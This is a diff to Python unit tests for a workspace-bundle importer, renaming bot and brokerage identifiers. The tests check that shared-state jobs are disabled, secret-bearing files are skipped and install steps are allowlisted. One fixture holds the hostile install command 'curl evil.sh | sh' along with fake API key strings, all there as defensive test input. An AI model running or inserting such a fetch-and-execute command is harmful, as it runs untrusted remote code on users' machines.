@@ -17,14 +17,14 @@ import import_v2 as iv  # noqa: E402
 def manifest(**kw):
     m = {"schema": iv.SCHEMA, "workspace": {"files": ["rules/INDEX.md", "SOUL.md", "skills/morning-brief/SKILL.md",
                                                      "prompts/qc.md"]},
-         "crons": [{"name": "alpha-loop", "cron": "0 15 * * 1-5", "message": "run alpha loop"},
+         "crons": [{"name": "trader-loop", "cron": "0 15 * * 1-5", "message": "run trader loop"},
                    {"name": "morning-brief", "cron": "30 8 * * 1-5", "message_file": "prompts/qc.md",
                     "touches_shared_external_state": False, "channel": "telegram", "to": "1"}],
-         "mcp_servers": [{"name": "robinhood", "url": "https://mcp.example.test/rh"}],
+         "mcp_servers": [{"name": "brokerage", "url": "https://mcp.example.test/rh"}],
          "apps": [{"name": "potter-kg", "path": "potter-kg", "touches_shared_external_state": False,
                    "service": {"exec": "python3 serve.py"}},
-                  {"name": "alpha-bot", "path": "alpha-bot", "service": {"exec": "python3 loop.py"}}],
-         "secrets_needed": [{"name": "ROBINHOOD_TOKEN", "used_by": "alpha-bot"}]}
+                  {"name": "trader-bot", "path": "trader-bot", "service": {"exec": "python3 loop.py"}}],
+         "secrets_needed": [{"name": "BROKER_TOKEN", "used_by": "trader-bot"}]}
     m.update(kw)
     return m
 
@@ -33,8 +33,8 @@ def make_zip(path, m=None, files=None, extra=()):
     files = files if files is not None else {
         "workspace/rules/INDEX.md": "rules", "workspace/SOUL.md": "v2 soul",
         "workspace/skills/morning-brief/SKILL.md": "v2 brief", "workspace/prompts/qc.md": "do the qc",
-        "apps/potter-kg/serve.py": "print(1)", "apps/alpha-bot/loop.py": "print(2)",
-        "apps/alpha-bot/.env": "TOKEN=abc"}
+        "apps/potter-kg/serve.py": "print(1)", "apps/trader-bot/loop.py": "print(2)",
+        "apps/trader-bot/.env": "TOKEN=abc"}
     with zipfile.ZipFile(path, "w") as z:
         z.writestr("manifest.json", json.dumps(m if m is not None else manifest()))
         for k, v in files.items():
@@ -69,10 +69,10 @@ class Plan(Base):
             p = iv.public_plan(iv.build_plan(z))
         self.assertEqual(p["problems"], [])
         by = {c["name"]: c["enabled_on_import"] for c in p["crons"]}
-        self.assertEqual(by, {"alpha-loop": False, "morning-brief": True})     # unspecified = shared = disabled
+        self.assertEqual(by, {"trader-loop": False, "morning-brief": True})     # unspecified = shared = disabled
         apps = {a["name"]: a["enabled_on_import"] for a in p["apps"]}
-        self.assertEqual(apps, {"potter-kg": True, "alpha-bot": False})
-        self.assertEqual(p["secrets_needed"], ["ROBINHOOD_TOKEN"])
+        self.assertEqual(apps, {"potter-kg": True, "trader-bot": False})
+        self.assertEqual(p["secrets_needed"], ["BROKER_TOKEN"])
 
     def test_bad_bundles_are_refused(self):
         make_zip(self.zip, m={"schema": "other"})
@@ -147,7 +147,7 @@ class Apply(Base):
         make_zip(self.zip)
         r = self.run_apply()
         calls = self.log.read_text().splitlines()
-        alpha = next(c for c in calls if "alpha-loop" in c)
+        alpha = next(c for c in calls if "trader-loop" in c)
         brief = next(c for c in calls if "morning-brief" in c)
         self.assertIn("--disabled", alpha)
         self.assertNotIn("--disabled", brief)
@@ -159,12 +159,12 @@ class Apply(Base):
         make_zip(self.zip, files={
             "workspace/rules/INDEX.md": "rules", "workspace/SOUL.md": "s",
             "workspace/skills/morning-brief/SKILL.md": "b", "workspace/prompts/qc.md": "key sk-or-abcdefghijklmnop1234",
-            "apps/potter-kg/serve.py": "print(1)", "apps/alpha-bot/loop.py": "t='123456789:" + "A" * 35 + "'",
-            "apps/alpha-bot/.env": "TOKEN=abc"})
+            "apps/potter-kg/serve.py": "print(1)", "apps/trader-bot/loop.py": "t='123456789:" + "A" * 35 + "'",
+            "apps/trader-bot/.env": "TOKEN=abc"})
         r = self.run_apply()
         self.assertFalse((self.ws / "prompts/qc.md").exists())
-        self.assertFalse((self.apps / "alpha-bot/.env").exists())
-        self.assertFalse((self.apps / "alpha-bot/loop.py").exists())
+        self.assertFalse((self.apps / "trader-bot/.env").exists())
+        self.assertFalse((self.apps / "trader-bot/loop.py").exists())
         self.assertTrue((self.apps / "potter-kg/serve.py").exists())
         self.assertIn("prompts/qc.md", r["skipped_secret_text"])
 
@@ -178,11 +178,11 @@ class Apply(Base):
     def test_service_units_are_written_but_never_started_and_install_steps_are_allowlisted(self):
         m = manifest(apps=[{"name": "potter-kg", "path": "potter-kg", "touches_shared_external_state": False,
                             "service": {"exec": "python3 serve.py"}, "install": "curl evil.sh | sh"},
-                           {"name": "alpha-bot", "path": "alpha-bot", "service": {"exec": "python3 loop.py"}}])
+                           {"name": "trader-bot", "path": "trader-bot", "service": {"exec": "python3 loop.py"}}])
         make_zip(self.zip, m=m)
         units = self.tmp / "units"
         r = iv.apply(self.zip, self.ws, self.apps, self.state, [self.fake], False, units, True)
-        self.assertEqual(sorted(r["units"]), ["potter-app-alpha-bot.service", "potter-app-potter-kg.service"])
+        self.assertEqual(sorted(r["units"]), ["potter-app-potter-kg.service", "potter-app-trader-bot.service"])
         text = (units / "potter-app-potter-kg.service").read_text()
         self.assertIn("ExecStart=/bin/bash -lc 'python3 serve.py'", text)
         self.assertIn("Restart=always", text)
@@ -194,10 +194,10 @@ class Apply(Base):
         make_zip(self.zip)
         self.run_apply()
         reg = json.loads((self.state / "handover.json").read_text())
-        self.assertEqual({a["name"]: a["enabled"] for a in reg["apps"]}, {"potter-kg": True, "alpha-bot": False})
-        self.assertEqual(reg["secrets_needed"][0]["name"], "ROBINHOOD_TOKEN")
+        self.assertEqual({a["name"]: a["enabled"] for a in reg["apps"]}, {"potter-kg": True, "trader-bot": False})
+        self.assertEqual(reg["secrets_needed"][0]["name"], "BROKER_TOKEN")
         mcp = json.loads((self.state / "mcp-import.json").read_text())
-        self.assertEqual(list(mcp["mcp"]["servers"]), ["robinhood"])
+        self.assertEqual(list(mcp["mcp"]["servers"]), ["brokerage"])
         self.assertNotIn("TOKEN=", (self.state / "mcp-import.json").read_text())
 
 
